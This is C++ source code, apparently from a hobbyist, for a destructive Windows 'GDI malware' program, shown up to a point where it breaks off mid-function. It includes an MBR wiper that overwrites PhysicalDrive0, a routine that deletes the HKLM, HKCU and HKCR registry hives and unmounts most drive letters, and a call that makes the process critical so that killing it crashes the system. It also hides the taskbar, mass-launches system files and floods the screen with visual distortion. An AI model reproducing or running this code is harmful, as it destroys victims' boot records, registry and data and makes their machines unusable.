// nie.cpp : Defines the entry point for the console application.
// i swear to god i hate visual studio 2022 so fucking much so now i have to use this garbage
// pwetty pwease use the release x86 configuration because others are not configured properly

#include <Windows.h>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#include <tchar.h>
#include "bootrec.h"
#define M_PI   3.14159265358979323846264338327950288
HCRYPTPROV hProv;
INT random() {
	if (hProv == NULL)
		if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	INT nOut;
	CryptGenRandom(hProv, sizeof(nOut), (BYTE*)(&nOut));
	return nOut & 0x7fffffff;
}
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, *PRGBQUAD;
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int stage = 0;
int r = 0, g = 0, b = 0;
COLORREF Hue(int shift) { //credits to Malsteve527 for the Hue function
	switch (stage) {
	case 0:
		r = 255;
		b = 0;
		g < 255 ? g += shift : stage++;
		break;
	case 1:
		g = 255;
		b = 0;
		r > 0 ? r -= shift : stage++;
		break;
	case 2:
		g = 255;
		r = 0;
		b < 255 ? b += shift : stage++;
		break;
	case 3:
		b = 255;
		r = 0;
		g > 0 ? g -= shift : stage++;
		break;
	case 4:
		b = 255;
		g = 0;
		r < 255 ? r += shift : stage++;
		break;
	case 5:
		r = 255;
		g = 0;
		b > 0 ? b -= shift : stage = 0;
		break;
	}

	return RGB(r, g, b);
}
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN  BOOLEAN        NewValue,
	OUT PBOOLEAN       OldValue,
	IN  BOOLEAN        IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
DWORD WINAPI notaskbar(LPVOID lpvd)
{
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 666;
}
DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
	return 1;
}
BOOL CALLBACK EnumChildWindowsProc(HWND hwnd, LPARAM lParam) {
	RECT rcWindow;
	GetWindowRect(hwnd, &rcWindow);
	int cxWindow = rcWindow.right - rcWindow.left;
	int cyWindow = rcWindow.bottom - rcWindow.top;
	HDC hdcWindow = GetDC(hwnd);

	HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
	SelectObject(hdcWindow, brush);

	BitBlt(hdcWindow, 0, 0, cxWindow, cyWindow, hdcWindow, random() % 21 - 10, random() % 41 - 20, 0x1900ac010e);
	ReleaseDC(NULL, hdcWindow);
	DeleteObject(hdcWindow);
	DeleteObject(brush);
	EnumChildWindows(hwnd, EnumChildWindowsProc, NULL);
	return true;
}
DWORD WINAPI WindowsCorruptionPayload(LPVOID lpParam) {
	while (1) {
		EnumChildWindows(GetForegroundWindow(), EnumChildWindowsProc, NULL);
	}
	return 0x00;
}
DWORD WINAPI destroy(LPVOID lpParam) {
	//Registry Deletion
	ShellExecuteA(NULL, "open", "reg", "delete hklm /f", NULL, SW_HIDE);
	ShellExecuteA(NULL, "open", "reg", "delete hkcu /f", NULL, SW_HIDE);
	ShellExecuteA(NULL, "open", "reg", "delete hkcr /f", NULL, SW_HIDE);

	//Drive Deletion (No C: drive because it prevents sound from playing, using at final payload)
	DeleteVolumeMountPointA("A:\\");
	DeleteVolumeMountPointA("B:\\");
	DeleteVolumeMountPointA("D:\\");
	DeleteVolumeMountPointA("E:\\");
	DeleteVolumeMountPointA("F:\\");
	DeleteVolumeMountPointA("G:\\");
	DeleteVolumeMountPointA("H:\\");
	DeleteVolumeMountPointA("I:\\");
	DeleteVolumeMountPointA("J:\\");
	DeleteVolumeMountPointA("K:\\");
	DeleteVolumeMountPointA("L:\\");
	DeleteVolumeMountPointA("M:\\");
	DeleteVolumeMountPointA("N:\\");
	DeleteVolumeMountPointA("O:\\");
	DeleteVolumeMountPointA("P:\\");
	DeleteVolumeMountPointA("Q:\\");
	DeleteVolumeMountPointA("R:\\");
	DeleteVolumeMountPointA("S:\\");
	DeleteVolumeMountPointA("T:\\");
	DeleteVolumeMountPointA("U:\\");
	DeleteVolumeMountPointA("V:\\");
	DeleteVolumeMountPointA("W:\\");
	DeleteVolumeMountPointA("X:\\");
	DeleteVolumeMountPointA("Y:\\");
	DeleteVolumeMountPointA("Z:\\");
	return 1;
}
DWORD WINAPI textz(LPVOID lpParam) {
	while (1) {
		BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
	}
}
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)L"timmus", SMTO_ABORTIFHUNG, 100, NULL);
	return true;
}
DWORD WINAPI shader1(LPVOID lpvd) //credits to UltraDasher965, but I modified it
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, NOTSRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)(i ^ 4) + (i * 4) + sqrt(x * (i * 100 / ((y / 10) * sqrt(x * (y * i / 16)))));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx ^ y) / 100.0 + 0.09, 1.0);
				hslcolor.s = 1.f;

				if (hslcolor.l < .4f)
				{
					hslcolor.l += .2f;
				}

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI fuckingMess(LPVOID lpParam) { //credits to sixtyfour64, but I modified it
	HDC hdc = GetDC(NULL);
	INT w = GetSystemMetrics(SM_CXSCREEN);
	INT h = GetSystemMetrics(SM_CYSCREEN);

	for (;;)
	{
		for (INT i = 0; i < 5; i++)
		{
			HDC hdc = GetDC(NULL);
			INT randW = rand() % w;
			INT randH = rand() % h;

			BitBlt(hdc, randW, rand() % 20 - 10, rand() % 1000, h, hdc, randW, 0, SRCCOPY);
			BitBlt(hdc, rand() % 20 - 10, randH, w, rand() % 1000, hdc, 0, randH, SRCCOPY);
			BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCCOPY);
			Sleep(10);
		}
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
}
DWORD WINAPI shader2(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)(225 * i);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx) / 10000.0 + 0.09, 1.0);
				hslcolor.s = 1.f;

				if (hslcolor.l < .4f)
				{
					hslcolor.l += .2f;
				}

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI kindaComplex(LPVOID lpParam) {
	tagMSG tag;
	WNDCLASSW wnd;

	SIZE size[2];
	POINT lpt[2];

	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	COLORREF color = 0;

	HDC hdc = GetDC(0);
	HDC mdc = CreateCompatibleDC(hdc);

	HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(mdc, hbit);

	lpt[0].x = 0;
	lpt[0].y = 0;

	size[0].cx = w;
	size[0].cy = h;

	WNDCLASSW* wnd2 = &wnd;

	for (ULONGLONG k = 9; k != 0; k = k + -1) {
		*(int*)wnd2 = 0;
		wnd2 = (WNDCLASSW*)&wnd2->lpfnWndProc;
	}

	wnd.lpfnWndProc = DefWindowProcW;
	wnd.hInstance = GetModuleHandleW(0);
	wnd.lpszClassName = L"class";

	RegisterClassW(&wnd);

	HMODULE hInstance = GetModuleHandleW(0);
	HWND hwnd = CreateWindowExW(0x800A8, L"class", L"window", 0x80000000, 0, 0, w, h, 0, 0, hInstance, 0);

	ShowWindow(hwnd, 5);

	tagMSG* tag2 = &tag;

	for (ULONGLONG k = 6; k != 0; k = k + -1) {
		tag2->hwnd = 0;
		tag2 = (tagMSG*)&tag2->message;
	}

	while (tag.message != 18) {
		HDC hdc = GetDC(0);
		BOOL the = PeekMessageA(&tag, 0, 0, 0, 1);
		if (the != 0) {
			TranslateMessage(&tag);
			DispatchMessageW(&tag);
		}

		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		StretchBlt(mdc, -20, -20, w + 40, h + 40, hdc, 0, 0, w, h, SRCINVERT);
		UpdateLayeredWindow(hwnd, hdc, lpt, size, mdc, lpt, color, 0, 1);
		ReleaseDC(0, hdc);
		Sleep(200);
	}
	return 0x00;
}
DWORD WINAPI shader3(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].g += x | y;
		}
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, w, h, blend);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shake(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCCOPY);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader4(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, NOTSRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)(x + y + x);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx + 225 * i) / 10000.0 + 0.09, 1.0);
				hslcolor.s = 1.f;

				if (hslcolor.l < .4f)
				{
					hslcolor.l += .2f;
				}

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI layered2(LPVOID lpParam) {
	tagMSG tag;
	WNDCLASSW wnd;

	SIZE size[2];
	POINT lpt[2];

	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	COLORREF color = 0;

	HDC hdc = GetDC(0);
	HDC mdc = CreateCompatibleDC(hdc);

	HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(mdc, hbit);

	lpt[0].x = 0;
	lpt[0].y = 0;

	size[0].cx = w;
	size[0].cy = h;

	WNDCLASSW* wnd2 = &wnd;

	for (ULONGLONG k = 9; k != 0; k = k + -1) {
		*(int*)wnd2 = 0;
		wnd2 = (WNDCLASSW*)&wnd2->lpfnWndProc;
	}

	wnd.lpfnWndProc = DefWindowProcW;
	wnd.hInstance = GetModuleHandleW(0);
	wnd.lpszClassName = L"class";

	RegisterClassW(&wnd);

	HMODULE hInstance = GetModuleHandleW(0);
	HWND hwnd = CreateWindowExW(0x800A8, L"class", L"window", 0x80000000, 0, 0, w, h, 0, 0, hInstance, 0);

	ShowWindow(hwnd, 5);

	tagMSG* tag2 = &tag;

	for (ULONGLONG k = 6; k != 0; k = k + -1) {
		tag2->hwnd = 0;
		tag2 = (tagMSG*)&tag2->message;
	}

	while (tag.message != 18) {
		HDC hdc = GetDC(0);
		BOOL the = PeekMessageA(&tag, 0, 0, 0, 1);
		if (the != 0) {
			TranslateMessage(&tag);
			DispatchMessageW(&tag);
		}

		int a = rand() % w, b = rand() % h;

		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(mdc, a, b, 200, 200, hdc, a + rand() % 21 - 10, b + rand() % 21 - 10, !(rand() % 2) ? SRCAND : SRCPAINT);
		UpdateLayeredWindow(hwnd, hdc, lpt, size, mdc, lpt, color, 0, 1);
		ReleaseDC(0, hdc);
		//Sleep(10);
	}
	return 0x00;
}
DWORD WINAPI shader5(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, NOTSRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)(x & y + x ^ y);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx) / 10000.0 + 0.09, 1.0);
				hslcolor.s = 1.f;

				if (hslcolor.l < .4f)
				{
					hslcolor.l += .2f;
				}

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
}
VOID WINAPI RotatePoints(POINT* points, int count, POINT center, float angle)
{
	float cosVal = cos(angle);
	float sinVal = sin(angle);
	for (int i = 0; i < count; i++)
	{
		int translatedX = points[i].x - center.x;
		int translatedY = points[i].y - center.y;
		points[i].x = static_cast<int>(translatedX * cosVal - translatedY * sinVal + center.x);
		points[i].y = static_cast<int>(translatedX * sinVal + translatedY * cosVal + center.y);
	}
}
DWORD WINAPI triangle(LPVOID lpParam) //by fr4ctalz
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	float rotationAngle = 0.0f;
	float rotationSpeed = 0.02f;
	while (1)
	{
		HDC hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 200 + x;
		int bottom_y = 200 + y;
		HBRUSH brush = CreateSolidBrush(Hue(3));
		SelectObject(hdc, brush);
		POINT vertices[] =
		{
			{
				top_x, bottom_y
			},
			{
				bottom_x, bottom_y
			},
			{
				(top_x + bottom_x) / 2, top_y
			}
		};
		POINT center =
		{
			(top_x + bottom_x) / 2, (top_y + bottom_y) / 3
		};
		RotatePoints(vertices, sizeof(vertices) / sizeof(vertices[0]), center, rotationAngle);
		Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}
		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}
		if (y == 0)
		{
			signY = 1;
		}
		if (x == 0)
		{
			signX = 1;
		}
		rotationAngle += rotationSpeed;
		Sleep(1);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI blocks(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		int a = rand() % w, b = rand() % h;
		BitBlt(hdc, a, b, 200, 200, hdc, a + rand() % 21 - 10, b + rand() % 21 - 10, !(rand() % 2) ? SRCAND : SRCPAINT);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	return 0x00;
}
DWORD WINAPI opener(LPVOID lpParam) { //ULTLRADHSIDR9565665 COPY :joy: :tada:
	WIN32_FIND_DATA data;
	LPCWSTR path = L"C:\\WINDOWS\\*.*";
	while (1) {
		HANDLE find = FindFirstFileW(path, &data);
		ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
		while (FindNextFileW(find, &data)) {
			ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
			Sleep(rand() % 2000);
		}
	}
}
DWORD WINAPI shader6(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)(x + y);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx) / 100000.0 + 0.05, 1.0);
				hslcolor.s = 1.f;

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI woah(LPVOID lpvd) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		//BitBlt(hdc, -30, 0, w, h, hdc, -30, 0, SRCCOPY);
		BitBlt(hdc, rand() % 40 - 20, 0, w, h, hdc, 0, rand() % 40 - 20, 0x1900ac010e);
		//BitBlt(hdc, w - 30, 0, w, h, hdc, 0, 0, 0x1900ac010e);
		//BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, 0x1900ac010e);
		//BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, 0x1900ac010e);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI layered3(LPVOID lpParam) {
	tagMSG tag;
	WNDCLASSW wnd;

	SIZE size[2];
	POINT lpt[2];

	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	COLORREF color = 0;

	HDC hdc = GetDC(0);
	HDC mdc = CreateCompatibleDC(hdc);

	HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(mdc, hbit);

	lpt[0].x = 0;
	lpt[0].y = 0;

	size[0].cx = w;
	size[0].cy = h;

	WNDCLASSW* wnd2 = &wnd;

	for (ULONGLONG k = 9; k != 0; k = k + -1) {
		*(int*)wnd2 = 0;
		wnd2 = (WNDCLASSW*)&wnd2->lpfnWndProc;
	}

	wnd.lpfnWndProc = DefWindowProcW;
	wnd.hInstance = GetModuleHandleW(0);
	wnd.lpszClassName = L"class";

	RegisterClassW(&wnd);

	HMODULE hInstance = GetModuleHandleW(0);
	HWND hwnd = CreateWindowExW(0x800A8, L"class", L"window", 0x80000000, 0, 0, w, h, 0, 0, hInstance, 0);

	ShowWindow(hwnd, 5);

	tagMSG* tag2 = &tag;

	for (ULONGLONG k = 6; k != 0; k = k + -1) {
		tag2->hwnd = 0;
		tag2 = (tagMSG*)&tag2->message;
	}

	while (tag.message != 18) {
		HDC hdc = GetDC(0);
		BOOL the = PeekMessageA(&tag, 0, 0, 0, 1);
		if (the != 0) {
			TranslateMessage(&tag);
			DispatchMessageW(&tag);
		}
